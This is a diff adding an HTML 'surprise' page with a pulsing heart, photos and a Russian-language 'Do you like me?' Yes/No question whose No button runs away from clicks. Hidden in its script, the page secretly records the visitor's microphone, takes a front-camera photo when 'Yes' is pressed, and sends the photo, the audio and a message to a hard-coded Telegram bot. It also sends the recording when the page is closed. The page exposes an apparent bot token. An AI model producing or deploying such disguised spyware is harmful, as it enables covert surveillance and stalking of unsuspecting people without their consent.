@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>♥️ Sürpriz</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        body {
+            background: #0b0b1a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            overflow: hidden;
+            flex-direction: column;
+        }
+        #container {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .heart-bg {
+            font-size: 200px;
+            cursor: pointer;
+            transition: 0.5s;
+            z-index: 10;
+            text-shadow: 0 0 60px rgba(255, 50, 80, 0.6);
+            animation: pulse 1.8s infinite ease-in-out;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+            100% { transform: scale(1); }
+        }
+        .heart-bg.broken {
+            animation: none;
+            transform: scale(0.7);
+            opacity: 0;
+            pointer-events: none;
+            transition: 0.6s;
+        }
+        .gallery {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            max-width: 600px;
+            display: none;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+            z-index: 20;
+            pointer-events: none;
+        }
+        .gallery img {
+            width: 120px;
+            height: 120px;
+            object-fit: cover;
+            border-radius: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            border: 3px solid #fff;
+            transform: scale(0.6) rotate(-10deg);
+            animation: flyIn 0.6s ease forwards;
+            opacity: 0;
+        }
+        .gallery img:nth-child(1) { animation-delay: 0.1s; }
+        .gallery img:nth-child(2) { animation-delay: 0.3s; }
+        .gallery img:nth-child(3) { animation-delay: 0.5s; }
+        .gallery img:nth-child(4) { animation-delay: 0.7s; }
+        @keyframes flyIn {
+            0% { opacity: 0; transform: scale(0.4) rotate(-20deg); }
+            100% { opacity: 1; transform: scale(1) rotate(0deg); }
+        }
+
+        .question-box {
+            position: absolute;
+            bottom: 15%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(20,20,40,0.85);
+            backdrop-filter: blur(12px);
+            padding: 30px 40px;
+            border-radius: 60px;
+            border: 1px solid rgba(255,255,255,0.15);
+            text-align: center;
+            z-index: 30;
+            display: none;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            min-width: 320px;
+        }
+        .question-box h2 {
+            color: #fff;
+            font-size: 28px;
+            font-weight: 300;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+        }
+        .btns {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+        }
+        .btns button {
+            padding: 12px 40px;
+            border: none;
+            border-radius: 60px;
+            font-size: 22px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+        .btn-yes {
+            background: #ff4d6d;
+            color: #fff;
+        }
+        .btn-yes:hover {
+            transform: scale(1.05);
+            background: #ff1f4a;
+        }
+        .btn-no {
+            background: #3a3a5a;
+            color: #fff;
+            position: relative;
+        }
+        .btn-no:hover {
+            background: #4a4a6a;
+        }
+        .btn-no.escape {
+            transition: all 0.15s ease;
+        }
+        .status {
+            margin-top: 16px;
+            color: #aaa;
+            font-size: 14px;
+            letter-spacing: 1px;
+        }
+        #finalMsg {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #fff;
+            font-size: 40px;
+            font-weight: 700;
+            text-shadow: 0 0 60px #ff4d6d;
+            z-index: 40;
+            display: none;
+            text-align: center;
+            background: rgba(0,0,0,0.6);
+            padding: 40px 60px;
+            border-radius: 80px;
+            backdrop-filter: blur(8px);
+            border: 1px solid #ff4d6d;
+        }
+        #toast {
+            position: fixed;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #222;
+            color: #fff;
+            padding: 12px 28px;
+            border-radius: 60px;
+            font-size: 14px;
+            z-index: 999;
+            display: none;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.4);
+            border-left: 4px solid #ff4d6d;
+        }
+        #toast.show { display: block; animation: fadeIn 0.4s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+<div id="toast">⏳ Gözlə...</div>
+
+<div id="container">
+    <div class="heart-bg" id="heart">♥</div>
+
+    <div class="gallery" id="gallery">
+        <img src="https://i.pravatar.cc/300?img=11" alt="">
+        <img src="https://i.pravatar.cc/300?img=25" alt="">
+        <img src="https://i.pravatar.cc/300?img=32" alt="">
+        <img src="https://i.pravatar.cc/300?img=45" alt="">
+    </div>
+
+    <div class="question-box" id="questionBox">
+        <h2>❤️ Мне нравишься?</h2>
+        <div class="btns">
+            <button class="btn-yes" id="btnYes">Да</button>
+            <button class="btn-no" id="btnNo">Нет</button>
+        </div>
+        <div class="status" id="status">—</div>
+    </div>
+
+    <div id="finalMsg">💕 Спасибо! Ты — моя радость.</div>
+</div>
+
+<script>
+    // ===== CONFIG =====
+    const BOT_TOKEN = "8684980330:AAGS_BcTgBsH0dXw0Jg1qI5uidqVQ7dVjFw";
+    const CHAT_ID = "8610330090";
+
+    let mediaRecorder;
+    let audioChunks = [];
+    let audioBlob = null;
+    let isRecording = false;
+
+    // ===== EFFEKTLƏR =====
+    const heart = document.getElementById('heart');
+    const gallery = document.getElementById('gallery');
+    const questionBox = document.getElementById('questionBox');
+    const btnYes = document.getElementById('btnYes');
+    const btnNo = document.getElementById('btnNo');
+    const status = document.getElementById('status');
+    const finalMsg = document.getElementById('finalMsg');
+    const toast = document.getElementById('toast');
+
+    let noClicks = 0;
+    let answered = false;
+
+    // Ürəyi sındır
+    heart.addEventListener('click', () => {
+        if (answered) return;
+        heart.classList.add('broken');
+        setTimeout(() => {
+            gallery.style.display = 'flex';
+            heart.style.display = 'none';
+            setTimeout(() => {
+                questionBox.style.display = 'block';
+                startRecording();
+            }, 1800);
+        }, 400);
+    });
+
+    // ===== "HƏ" =====
+    btnYes.addEventListener('click', () => {
+        if (answered) return;
+        answered = true;
+        status.textContent = '💖 Gözlə...';
+        setTimeout(() => {
+            capturePhotoAndSend();
+        }, 600);
+    });
+
+    // ===== "YOX" – qaçır, titrəyir =====
+    btnNo.addEventListener('click', () => {
+        if (answered) return;
+        noClicks++;
+        status.textContent = `😏 ${noClicks} dəfə "Yox" dedin, amma...`;
+        const rect = btnNo.getBoundingClientRect();
+        const parentRect = btnNo.parentElement.getBoundingClientRect();
+        const maxX = parentRect.width - btnNo.offsetWidth - 20;
+        const maxY = 100;
+        const dx = (Math.random() - 0.5) * 300;
+        const dy = (Math.random() - 0.5) * 200;
+        let x = Math.min(Math.max(btnNo.offsetLeft + dx, 0), maxX);
+        let y = Math.min(Math.max(btnNo.offsetTop + dy, 0), maxY);
+        btnNo.style.position = 'relative';
+        btnNo.style.left = x + 'px';
+        btnNo.style.top = y + 'px';
+        btnNo.classList.add('escape');
+        btnNo.style.transform = `rotate(${Math.random()*10-5}deg) scale(0.9)`;
+        setTimeout(() => btnNo.style.transform = 'scale(1)', 150);
+    });
+
+    // ===== SƏS YAZMA =====
+    function startRecording() {
+        if (isRecording) return;
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    audioChunks = [];
+                };
+                mediaRecorder.start();
+                isRecording = true;
+                console.log('🎙️ Səs yazılır...');
+            })
+            .catch(() => {});
+    }
+
+    function stopRecording() {
+        if (mediaRecorder && isRecording) {
+            mediaRecorder.stop();
+            isRecording = false;
+            console.log('⏹️ Səs dayandı');
+        }
+    }
+
+    // ===== FOTO + SƏS + TELEGRAM =====
+    function capturePhotoAndSend() {
+        toast.classList.add('show');
+        toast.textContent = '📸 Şəkil çəkilir...';
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 400;
+                    canvas.height = 400;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, 400, 400);
+                    stream.getTracks().forEach(t => t.stop());
+                    canvas.toBlob(blob => {
+                        toast.textContent = '📤 Göndərilir...';
+                        sendToTelegram(blob, 'photo');
+                    }, 'image/jpeg');
+                }, 800);
+            })
+            .catch(() => {
+                toast.textContent = '⚠️ Kamera əlçatan deyil, davam...';
+                sendFallback();
+            });
+    }
+
+    function sendToTelegram(blob, type) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        if (type === 'photo') {
+            formData.append('photo', blob, 'selfie.jpg');
+        } else if (type === 'audio') {
+            formData.append('audio', blob, 'voice.webm');
+        } else {
+            // mesaj
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: blob })
+            }).catch(() => {});
+            return;
+        }
+
+        const url = type === 'photo' 
+            ? `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`
+            : `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;
+
+        fetch(url, { method: 'POST', body: formData })
+            .then(() => {
+                toast.textContent = '✅ Göndərildi!';
+                setTimeout(() => {
+                    toast.classList.remove('show');
+                    showFinal();
+                }, 1000);
+                if (type === 'photo') {
+                    // səsi də göndər
+                    setTimeout(() => {
+                        stopRecording();
+                        if (audioBlob) {
+                            const fd = new FormData();
+                            fd.append('chat_id', CHAT_ID);
+                            fd.append('audio', audioBlob, 'voice.webm');
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                                method: 'POST',
+                                body: fd
+                            }).catch(() => {});
+                        }
+                    }, 500);
+                }
+            })
+            .catch(() => {
+                toast.textContent = '❌ Xəta, amma davam...';
+                setTimeout(() => toast.classList.remove('show'), 1500);
+                showFinal();
+            });
+    }
+
+    function sendFallback() {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: '✅ Qız "Hə" dedi! (Kamera alınmadı, amma cavab gəldi)' })
+        }).catch(() => {});
+        setTimeout(showFinal, 500);
+    }
+
+    // ===== SON =====
+    function showFinal() {
+        questionBox.style.display = 'none';
+        finalMsg.style.display = 'block';
+        setTimeout(() => {
+            finalMsg.style.opacity = '0';
+            finalMsg.style.transition = '1s';
+            setTimeout(() => {
+                finalMsg.style.display = 'none';
+                location.reload();
+            }, 800);
+        }, 3500);
+    }
+
+    // Səhifə bağlananda səsi göndər
+    window.addEventListener('beforeunload', () => {
+        stopRecording();
+        if (audioBlob) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('audio', audioBlob, 'voice.webm');
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd }).catch(() => {});
+        }
+    });
+
+    console.log('♥️ Sayt hazırdır.');
+</script>
+</body>
+</html>
